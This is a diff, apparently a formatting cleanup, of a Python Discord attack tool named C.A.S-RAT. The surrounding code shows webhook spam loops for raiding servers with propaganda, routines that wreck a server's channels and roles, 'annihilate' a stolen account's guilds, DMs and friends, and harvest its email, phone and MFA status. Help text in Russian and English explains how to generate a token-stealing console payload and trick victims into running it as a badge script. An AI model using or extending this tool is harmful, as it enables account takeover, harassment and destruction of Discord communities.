@@ -12,7 +12,6 @@ def cls():
 # Check Update----------------------------------------------+
 
 
-
 updateStatus = ""
 updateSoft = ""
 currentVersion = ""
@@ -135,9 +134,7 @@ jsonHook = {"name": "C.A.S-RAT;", "avatar": None}
 
 defaultMessage = "```| The server is under raid attack in the name of Anarchy. Don't worry, this will end sometime, but for now, please don't interfere with the raid. Your hate will not help in this situation, because your opinion does not matter to Anarchy. Do you want to learn the secrets of anarchy, and become its participant? Or maybe you want to expand your knowledge in this subject? | Then here's our telegram =>``` ```t.me/anarchy_squad``` @everyone"
 
-defaultMessage2 = (
-    "```| Welcome to Cyber-Crypto.Anarchy.Squad. This raid is not intended to hurt you in any way, this raid has its own reasons. To stop this, find whoever is the server to send requests to the raid bots. Good luck to you. | Our telegram =>``` ```t.me/anarchy_squad``` @everyone"
-)
+defaultMessage2 = "```| Welcome to Cyber-Crypto.Anarchy.Squad. This raid is not intended to hurt you in any way, this raid has its own reasons. To stop this, find whoever is the server to send requests to the raid bots. Good luck to you. | Our telegram =>``` ```t.me/anarchy_squad``` @everyone"
 
 dMdefaultText = "```| This user's account has been annihilated | Our telegram =>``` ```t.me/anarchy_squad```"
 
@@ -221,7 +218,7 @@ helpSpamEN = "This item will allow you to arrange a raid on a server in 1, or al
 
 helpScriptGenRU = """
 Этот пункт сделан для тех кому нужно быстро сгенерировать   пейлоад для кражи токена. Сам скрипт выдаёт жертве в профиль все значки дискорда, и отсылает на вебхук её токен. Чтобы она его смогла запустить, ей нужно открыть консоль: Ctrl + Shift + i , или F12. Откроется панель разработчика, где нужно перейти во вкладку Console. Примечание: скрипт нужно позиционировать как скрипт для получения локальных значков, на 1 сессию дискорда. Тогда у жертвы не должно возникнуть вопросов. Если вы передаёте его через дискорд, то дожны учитывать что дискорд использует форматирование текста. И дабы избежать нарушения структуры скрипта, помещайте его в тройные кавычки ( ``` ). Так вы поместите код в условный блок кода, в котором синтаксис кода не нарушается.
-""" 
+"""
 
 helpScriptGenEN = "This item is made for those who need to quickly generate a payload to steal a token. The script itself gives the victim in profile all the discord icons, and sends her token to the webhook. In order for her to run it, she needs to open the console: Ctrl + Shift + i, or F12. The developer panel will open, where you need to go to the Console tab. Note: the script must be positioned as a script to get local icons for 1 discord session. Then the victim shouldnt have any questions. If you are transmitting it via discord, then you should take into account that discord uses text formatting. And to avoid breaking the structure of the script, put it in triple quotes ( ``` ). This will place your code in a conditional block of code that does not violate the syntax of your code."
 
@@ -341,15 +338,17 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
             print("\nSpam started.")
             while True:
                 req = post(
-                    webhook, 
+                    webhook,
                     data={
                         "content": hookMessage,
                         "username": hookName,
                         "avatar_url": hookAvatar,
-                    }
+                    },
                 )
                 if req.status_code not in statuses:
-                    print(f"I can't send message in webhook. \nError response: {req.status_code}")
+                    print(
+                        f"I can't send message in webhook. \nError response: {req.status_code}"
+                    )
                     errorLog.write(
                         f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                     )
@@ -379,7 +378,9 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
                             }
                             req = post(webhook, data=info)
                             if req.status_code not in statuses:
-                                print(f"I can't send message in webhook. \nError response: {req.status_code}")
+                                print(
+                                    f"I can't send message in webhook. \nError response: {req.status_code}"
+                                )
                                 errorLog.write(
                                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                 )
@@ -402,7 +403,6 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
                 hookName = nameHooks
                 hookAvatar = icons
                 hookMessage = defaultMessage
-            # headers = {"Authorization": token}
             request = get(
                 f"https://discord.com/api/v8/guilds/{serverID}/channels",
                 headers={"Authorization": token},
@@ -454,15 +454,18 @@ def Webhook_tool(defaultMessage, icons, nameHooks, jsonHook, statuses):
                             while True:
                                 for x in webhooks:
                                     webhook = x.rstrip()
-                                    req = post(webhook,
+                                    req = post(
+                                        webhook,
                                         data={
                                             "content": hookMessage,
                                             "username": hookName,
                                             "avatar_url": hookAvatar,
-                                        }
+                                        },
                                     )
                                     if req.status_code not in statuses:
-                                        print(f"I can't send message in webhook. \nError response: {req.status_code}")
+                                        print(
+                                            f"I can't send message in webhook. \nError response: {req.status_code}"
+                                        )
                                         errorLog.write(
                                             f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                         )
@@ -586,9 +589,7 @@ def crash(jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
             payload = {"name": "C.A.S"}
             request = get(
                 f"https://discord.com/api/v8/guilds/{serverID}/channels",
-                headers={
-                    "Authorization": token
-                },
+                headers={"Authorization": token},
             )
             if request.status_code in statuses:
                 info = request.json()
@@ -599,7 +600,8 @@ def crash(jsonHook, defaultMessage, nameHooks, icons, icon, statuses):
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                 )
             request = get(
-                f"https://discord.com/api/v8/guilds/{serverID}/roles", headers={"Authorization": token}
+                f"https://discord.com/api/v8/guilds/{serverID}/roles",
+                headers={"Authorization": token},
             )
             if request.status_code in statuses:
                 info2 = request.json()
@@ -879,7 +881,9 @@ def scriptGen():
                 print(f"\nCopy this script, and give your victim. ==>")
                 print(f"\n{script2}")
                 print()
-                print("THANKS TO EZRAIDv2 for updated script (https://github.com/EZRAIDv2)")
+                print(
+                    "THANKS TO EZRAIDv2 for updated script (https://github.com/EZRAIDv2)"
+                )
             else:
                 errorLog.write(
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
@@ -927,7 +931,8 @@ def validToken(token: str = None, for_nuker: bool = True):
                 token = input("\nToken: ")
                 headers = {"Authorization": token}
                 request = get(
-                    "https://canary.discord.com/api/v8/users/@me/library", headers=headers
+                    "https://canary.discord.com/api/v8/users/@me/library",
+                    headers=headers,
                 )
                 if for_nuker:
                     if request.status_code == 403:
@@ -1454,7 +1459,8 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
             d = 0
             print("\nStarted annihilation.")
             req = get(
-                "https://discord.com/api/v8/users/@me/guilds", headers={"Authorization": token}
+                "https://discord.com/api/v8/users/@me/guilds",
+                headers={"Authorization": token},
             )
             if req.status_code in statuses:
                 for server in req.json():
@@ -1480,7 +1486,11 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     req = patch(
                         "https://discord.com/api/v8/users/@me/settings",
                         headers={"Authorization": token},
-                        json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
+                        json={
+                            "theme": "dark",
+                            "locale": "zh-TW",
+                            "status": "invisible",
+                        },
                     )
                     if req.status_code not in statuses:
                         errorLog.write(
@@ -1491,7 +1501,8 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                 )
             req = get(
-                "https://discord.com/api/v8/users/@me/channels", headers={"Authorization": token}
+                "https://discord.com/api/v8/users/@me/channels",
+                headers={"Authorization": token},
             )
             if req.status_code in statuses:
                 for dm in req.json():
@@ -1518,7 +1529,11 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     req = patch(
                         "https://discord.com/api/v8/users/@me/settings",
                         headers={"Authorization": token},
-                        json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
+                        json={
+                            "theme": "dark",
+                            "locale": "zh-TW",
+                            "status": "invisible",
+                        },
                     )
                     if req.status_code not in statuses:
                         errorLog.write(
@@ -1544,7 +1559,11 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     req = patch(
                         "https://discord.com/api/v8/users/@me/settings",
                         headers={"Authorization": token},
-                        json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
+                        json={
+                            "theme": "dark",
+                            "locale": "zh-TW",
+                            "status": "invisible",
+                        },
                     )
                     if req.status_code not in statuses:
                         errorLog.write(
@@ -1555,7 +1574,8 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                 )
             req = get(
-                "https://discord.com/api/v8/users/@me/relationships", headers={"Authorization": token}
+                "https://discord.com/api/v8/users/@me/relationships",
+                headers={"Authorization": token},
             )
             if req.status_code in statuses:
                 for friend in req.json():
@@ -1581,7 +1601,11 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     req = patch(
                         "https://discord.com/api/v8/users/@me/settings",
                         headers={"Authorization": token},
-                        json={"theme": "dark", "locale": "zh-TW", "status": "invisible"},
+                        json={
+                            "theme": "dark",
+                            "locale": "zh-TW",
+                            "status": "invisible",
+                        },
                     )
                     if req.status_code not in statuses:
                         errorLog.write(
@@ -1613,7 +1637,9 @@ def tokenAnnihilation(icon, dMdefaultText, statusName):
                     # )
                     print(f"ERROR. Status code: {req.status_code}. Json: {req.json()}")
                 req = post(
-                    "https://discord.com/api/v8/guilds", headers={"Authorization": token}, json=payload
+                    "https://discord.com/api/v8/guilds",
+                    headers={"Authorization": token},
+                    json=payload,
                 )
                 if req.status_code not in statuses:
                     # errorLog.write(
@@ -1783,16 +1809,22 @@ def grabInfo():
                     "https://canary.discordapp.com/api/v8/users/@me", headers=headers
                 )
                 if r.status_code in statuses:
-                    userName = (
-                        r.json()["username"] + "#" + r.json()["discriminator"]
-                    )
+                    userName = r.json()["username"] + "#" + r.json()["discriminator"]
                     userID = r.json()["id"]
                     phone = r.json()["phone"]
                     email = r.json()["email"]
                     mfa = r.json()["mfa_enabled"]
                     bio = r.json()["bio"]
-                    avatar = r.json()["avatar"] if r.json()["avatar"] is not None else 'Default'
-                    banner = r.json()["banner"] if r.json()["banner"] is not None else 'Default'
+                    avatar = (
+                        r.json()["avatar"]
+                        if r.json()["avatar"] is not None
+                        else "Default"
+                    )
+                    banner = (
+                        r.json()["banner"]
+                        if r.json()["banner"] is not None
+                        else "Default"
+                    )
                     banner_color = r.json()["banner_color"]
                     locale = r.json()["locale"]
                     nsfw = r.json()["nsfw_allowed"]
@@ -1817,7 +1849,7 @@ def grabInfo():
                 errorLog.write(
                     f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Token is {validToken(token, for_nuker=True)}]\n"
                 )
-                print(f'{token} is {validToken(token, for_nuker=True)}')
+                print(f"{token} is {validToken(token, for_nuker=True)}")
         elif select == "2":
             print(menu)
             select = str(input("\nSelect: "))
@@ -1834,7 +1866,9 @@ def grabInfo():
     errorLog.close()
     input("\nPress key to continue.")
 
+
 # ACCOUNT NUKER -------------------------------------------+
+
 
 def nuker():
     token = input("\nToken: ")
@@ -1842,20 +1876,29 @@ def nuker():
         while True:
             api = get("https://discordapp.com/api/v6/invite/dP7wGQxrSt")
             data = api.json()
-            check = get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
-            if check.json()['code'] != 40002:
-                post("https://discordapp.com/api/v6/invite/dP7wGQxrSt", headers={"Authorization": token})
-                delete("https://discordapp.com/api/v6/guilds" + data['guild']['id'], headers={"Authorization": token})
+            check = get(
+                "https://discordapp.com/api/v6/guilds/" + data["guild"]["id"],
+                headers={"Authorization": token},
+            )
+            if check.json()["code"] != 40002:
+                post(
+                    "https://discordapp.com/api/v6/invite/dP7wGQxrSt",
+                    headers={"Authorization": token},
+                )
+                delete(
+                    "https://discordapp.com/api/v6/guilds" + data["guild"]["id"],
+                    headers={"Authorization": token},
+                )
             else:
                 print("Account Banned or Phone locked")
                 break
-        input("\nPress key to continue.")   
+        input("\nPress key to continue.")
     elif validToken(token, True) == "Phone locked.":
         print("This token have been phone lock")
-        input("\nPress key to continue.") 
+        input("\nPress key to continue.")
     else:
         print("This token is invalid =(")
-        input("\nPress key to continue.") 
+        input("\nPress key to continue.")
 
 
 # Interaction----------------------------------------------+
@@ -1912,14 +1955,18 @@ while True:
             print("\nGoodbye!")
             time.sleep(2)
             if updateSoft:
-                rename("metadata.json", 'metadata_old.json')
-                with get("https://raw.githubusercontent.com/posreadyxp/C.A.S-Discord-Tool/main/metadata.json") as d:
+                rename("metadata.json", "metadata_old.json")
+                with get(
+                    "https://raw.githubusercontent.com/posreadyxp/C.A.S-Discord-Tool/main/metadata.json"
+                ) as d:
                     print(d.content)
-                    with open("metadata.json", 'wb') as f:
+                    with open("metadata.json", "wb") as f:
                         f.write(d.content)
                 rename("tool.py", "tool_old.py")
-                with get("https://raw.githubusercontent.com/posreadyxp/C.A.S-Discord-Tool/main/tool.py") as d:
-                    with open("tool.py", 'wb') as f:
+                with get(
+                    "https://raw.githubusercontent.com/posreadyxp/C.A.S-Discord-Tool/main/tool.py"
+                ) as d:
+                    with open("tool.py", "wb") as f:
                         f.write(d.content)
             exit()
         else:
